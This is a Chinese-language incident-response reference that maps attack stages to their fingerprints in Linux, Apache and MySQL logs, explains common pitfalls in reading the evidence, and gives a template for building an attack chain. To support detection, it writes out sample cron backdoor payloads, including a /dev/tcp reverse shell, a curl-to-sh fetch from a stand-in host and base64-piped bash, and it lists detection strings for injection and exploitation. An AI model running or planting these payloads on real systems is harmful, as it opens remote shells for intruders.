# 攻击手法日志指纹与判据陷阱

## 一、按攻击阶段的手法指纹

### 1. 初始访问（Initial Access）

| 手法 | 日志指纹 | 定位方法 |
|---|---|---|
| SSH 口令爆破 | 大量 `Failed password for X from IP`，末尾出现 `Accepted password` | 按 IP 统计失败数，取最后一次失败附近的首个 Accepted |
| Web 后台爆破 | 高频 `POST /login.php`（或 `/admin`、`/wp-login.php`），失败响应体大小固定，成功后状态码/大小突变 | 统计同一 IP 对登录路径的 POST 次数与时间跨度 |
| 漏洞利用 | 单次异常请求：超长参数、`../`、`${jndi:`、`?cmd=`、畸形 Content-Type | 查 error.log 的 Fatal error、超长 URL |
| 文件上传 getshell | `POST` 到 upload 接口，随后访问新出现的 `.php` 路径 | 对比上传接口调用与后续脚本首次访问的时间差 |

**关键**：Web 爆破要区分"失败也返回 302"的站点。判定成功的唯一可靠依据是**登录后才能访问的页面返回 200**（如 `admin.php?action=start`、`dashboard`、`index.php?module=admin`）。

### 2. 命令执行（Execution）

| 手法 | 日志指纹 |
|---|---|
| WebShell | access.log 出现 `POST /path/shell.php` 且 200；error.log 出现该文件的 PHP Notice/Undefined index |
| 反序列化/模板注入 | 请求体异常但 200，随后系统层出现 `sh -c` 进程（需 auditd） |
| SQL 注入 | access.log 中 `UNION SELECT`、`sleep(`、`extractvalue`；MySQL 日志出现 `INTO OUTFILE` |

WebShell 的**强证据**是 error.log 里的 PHP 运行时错误——它证明该文件被 PHP 引擎解析执行，而不是仅被请求：

```
PHP Notice: Undefined offset: 1 in /var/www/html/data/modules/lndex.php on line 1
```

（`$_REQUEST[1]` 未传参产生的 Notice，反向证明木马代码已执行）

### 3. 持久化（Persistence）

| 手法 | 检查位置 | 日志线索 |
|---|---|---|
| 计划任务 | `/var/spool/cron/crontabs/<user>`、`/etc/cron.d/`、`/etc/crontab` | `crontab[..]: (root) REPLACE (root)`；`CRON[..]: (root) CMD (...)` |
| 服务自启 | `/etc/systemd/system/*.service`、`/etc/init.d/` | `systemd[1]: Started <异常服务名>` |
| 开机脚本 | `/etc/rc.local`、`/etc/profile.d/`、`~/.bashrc` | 登录时 `session opened` 后紧跟异常进程 |
| SSH 公钥 | `~/.ssh/authorized_keys`、`/root/.ssh/` | `Accepted publickey for root from <陌生IP>` |
| 动态链接劫持 | `/etc/ld.so.preload` | 无直接日志，需文件检查 |
| PAM 后门 | `/lib/*/security/pam_*.so` | 每次登录都触发，日志中无异常但文件 mtime 异常 |
| 隐藏账户 | `/etc/passwd` 中 UID=0 的非 root 项 | `useradd[..]: new user: name=X, UID=0` |

**cron 后门常见载荷形态：**

```bash
* * * * * root bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
* * * * * echo <base64> | base64 -d | bash          # 无文件落地
* * * * * curl http://evil/x.sh | sh
* * * * * python -c 'import socket,subprocess,os;...'
@reboot /dev/shm/.x                                  # 临时目录隐藏文件
```

Base64 载荷解码：`echo '<b64>' | base64 -d`

### 4. 提权（Privilege Escalation）

| 漏洞/手法 | 日志指纹 | 备注 |
|---|---|---|
| **PwnKit CVE-2021-4034** | `pkexec[..]: X: The value for the SHELL variable was not found ... [USER=root] [TTY=...] [CWD=/tmp] [COMMAND=GCONV_PATH=./.pkexec PATH=GCONV_PATH=. CHARSET=pkexec SHELL=pkexec]` | **GCONV_PATH + CHARSET=pkexec 是决定性指纹**；CWD 一般在 /tmp |
| sudo 配置滥用 | `sudo: X : TTY=... ; PWD=... ; USER=root ; COMMAND=/bin/bash` | 看 COMMAND 是否为 shell/编辑器 |
| SUID 滥用 | 无日志，需 `find / -perm -4000` 比对基线 | 关注 /tmp、/home 下的 SUID 文件 |
| DirtyPipe CVE-2022-0847 | 无直接日志，内核 5.8~5.16 | 看 /tmp 残留与文件被改但 mtime 不变 |
| 内核 exploit | `kern.log` 出现 segfault、`traps:` | `dmesg | grep -i segfault` |
| 数据库 UDF | mysql.log 出现 `CREATE FUNCTION`、`sys_exec` | 结合 `plugin_dir` 可写 |

**PwnKit 排他性验证**（确认不是正常 pkexec 调用）：
1. 执行者是否为低权用户（`USER=root` 但触发者不是 root）
2. 是否带 `GCONV_PATH`、`CHARSET` 环境变量
3. `CWD` 是否在可写目录（/tmp、/dev/shm、/var/tmp）
4. 该用户是否本来就在 sudo 组（`id <user>`），若不在则无法正常 sudo

### 5. 横向移动（Lateral Movement）

| 手法 | 日志指纹 |
|---|---|
| su 切换 | `Successful su for <目标> by <执行者>` + `session opened for user X by (uid=N)` |
| SSH 内网跳转 | `Accepted password for X from <内网IP>`，源 IP 非管理网段 |
| 复用口令 | 同一账号在短时间内从多个来源、多个服务（Web→系统→数据库）出现 |

`uid=33` = www-data，`uid=0` = root。**看到 `su ... by (uid=33)` 就说明 Web 进程被打穿后横向到系统账户。**

### 6. 数据窃取（Collection & Exfiltration）

| 手法 | 日志指纹 |
|---|---|
| 数据库踩点 | mysql.log：`show databases`、`show tables`、`Init DB information_schema` |
| 拖库 | 大量 `SELECT * FROM <业务表>`、`LIMIT 0,1000` 循环 |
| 写文件提权 | `SELECT ... INTO OUTFILE '/var/www/html/x.php'` |
| 打包外传 | 无日志，需查 `ss -antp`、防火墙日志、DNS 日志 |

### 7. 痕迹清理（Defense Evasion）

| 手法 | 识别方法 |
|---|---|
| 删除日志 | 文件大小 0、时间线缺口、轮转链断裂 |
| `history -c` | `~/.bash_history` 为空或缺失 |
| 伪造时间戳 | `touch -t` 改 mtime，但 **ctime 无法伪造**（除非改系统时钟） |
| 重命名伪装 | `lndex.php`（小写 L）、`index.php.bak`、`.index.php`、`1.php` |

## 二、判据陷阱（最容易出错的地方）

### 陷阱 1：状态码 302 ≠ 登录成功
很多 CMS 登录失败也返回 302（跳回登录页）。**判定成功必须以"登录后才能访问的页面返回 200"为准**，并结合响应体大小变化。

### 陷阱 2：mtime 可伪造，必须看 ctime
```bash
stat 文件    # Modify 可被 touch 改；Change(ctime) 只有元数据真实变更才更新
```
实战案例：木马 mtime 被改为 `2022-12-13 08:35`，但 **ctime = 上传请求同一秒**。仅看 mtime 会得出完全错误的时间结论。

### 陷阱 3：auth.log 与 syslog 重复记录
同一事件在 `auth.log` 和 `syslog` 各出现一次。统计次数、拼接时间线时**必须去重**（按 时间+原文）。

### 陷阱 4：syslog 无年份，跨年必错一半
`Dec 14 01:56:48` 没有年份。跨年日志（去年部署、今年被攻击）会全部错位，而**同一份 auth.log 里可能同时存在两个年份的事件**——用一个 `--year` 必然错一半，这不是 bug，是格式的固有限制。

可靠做法：用 **wtmp / btmp 的绝对时间反查**。它们存 epoch 秒，把「月-日-时-分」与 auth.log 对齐：

- 若两边时分的记录完全重合、年份却不同 → `--year` 补错了，按 wtmp 的年份改
- 若 auth.log 里存在两个不同"事件簇"（如 Oct 与 Dec），很可能跨年，分别用不同 `--year` 各跑一次比对

`log_triage.py` 会自动做这个交叉检测并在报告头告警。实战案例：auth.log 显示 `2022-10-08 04:33` 的失败登录，btmp 同一时分记录是 `2021-10-08` —— 真实年份差了一年。

### 陷阱 5：正常运维被误判为攻击
典型案例：管理员 IP 大量访问后台、SSH 登录 root、修改站点内容。区分依据：
- 是否有**爆破**（高频失败）
- 是否**上传可执行文件**到可写目录
- 是否伴随**提权、新建账户、cron 变更**
- Referer/UA 是否与正常浏览一致
- 时间是否在工作时段、是否与业务变更吻合

### 陷阱 6：200 不代表业务成功
WebShell 请求返回 200 只说明脚本被调用；登录页 200 只说明页面渲染。要结合响应大小、后续请求链判断。

### 陷阱 7：用户级 crontab 与 /etc/cron.d 格式不同
- 用户 crontab（`crontab -e`）：`* * * * * <命令>` —— 无 user 字段，整行交给 `sh -c`
- `/etc/cron.d/x`：`* * * * * <user> <命令>` —— 有 user 字段

若用户 crontab 里误写成 `* * * * * root echo ...`，`sh` 会把 `root` 当命令名执行并报 `command not found`，**后门看似存在但实际不生效**。判断依据：
- cron.log 中 `(root) CMD (root echo ...)` —— CMD 内含 `root` 说明是用户 crontab 且格式有误
- 每次执行后有 `(CRON) info (No MTA installed, discarding output)` —— 说明有报错输出
- `ss -antp` 中无对应外连 —— 反弹未建立

**结论要写成"已植入、可触发、但载荷未成功回连"，而不是简单说"存在后门"。**

### 陷阱 8：环境被重置多次
靶场/快照环境常出现：MySQL 日志多个 `started with:` 头、auth.log 多次 `chpasswd ... password changed for root`、同一时间点重复出现启动日志。这说明**判分环境重置过**，分析时必须锚定"攻击发生的那个时间窗口"，忽略其他轮次。

### 陷阱 9：日志时间乱序
重启、NTP 纠偏会导致日志文件中时间不单调。**不要按文件行序推断因果**，必须按解析后的时间戳排序。

### 陷阱 10：btmp 的失败登录是 `type=6`
Linux 写 btmp 用 `LOGIN_PROCESS(6)`，不是 `USER_PROCESS(7)`。按 7 过滤会**一条都读不到**，从而误判"没有 SSH 爆破"。

反过来，wtmp 里的 `type=6` 是 getty 登录提示符，不是真实会话，混进去会凭空多出登录记录。正确做法：btmp 认 6 和 7，wtmp 只认 7。

### 陷阱 11：Apache error.log 的方括号顺序不固定
同一条错误，不同版本/模块的排列不同：

```
[Wed Dec 14 01:59:55.536709 2022] [php7:notice] [pid 22606] [client 192.168.226.24:55996] PHP Notice: ...
└──────── 时间 ────────┘          └─模块─┘      └─pid─┘   └──── client ────┘
```

`[php7:notice]` 常排在 `[pid]` **之前**。写成"`[pid]` → `[client]` → `[模块]`"固定顺序的正则会取不到 client IP，而 client IP 恰恰是把"PHP 报错"关联到"某个攻击者执行了木马"的唯一纽带。

稳妥做法：只锚定时间戳，剩下的逐段剥离方括号，识别 `client`、`pid`、其余视为模块级别。

判据上还要收紧：`Undefined variable` 这类 PHP Notice 正常业务也会报。只有**报错文件本身像木马**（`lndex.php`、`cmd.php`、双扩展名）或出现 `eval()'d code`，才可作为木马执行证据。

### 陷阱 12：MySQL 拒绝登录被写两遍
`Access denied` 会同时出现在 general log（带连接号，如 `[7]`）和 error log（不带连接号）。不按 (时间, 消息) 去重，三次试探会显示成六次，容易把"试探"误读成"持续爆破"。

保留带连接号的那条：它能和同 tid 的后续 `Query` 关联，重建攻击者的完整操作序列。

## 三、攻击链建模模板（七要素）

按以下七项填空，每一项都要有"时间 + 证据行"：

1. **攻击者身份**：源 IP、UA、是否内网/外网、是否有多个来源
2. **入口点**：怎么进来的（爆破/漏洞/弱口令）、首次成功时间
3. **权限落地**：getshell 方式、落地文件路径、首次执行时间
4. **横向**：从服务账户到系统账户的过程与时间
5. **提权**：方法（CVE 编号/配置缺陷）、时间、证据指纹
6. **数据访问**：数据库/文件访问的时间与范围
7. **持久化**：后门位置、植入时间、载荷内容、**实际是否生效**

任何一项缺证据，都要在报告中标注"待上机确认"，不要用推测填补。
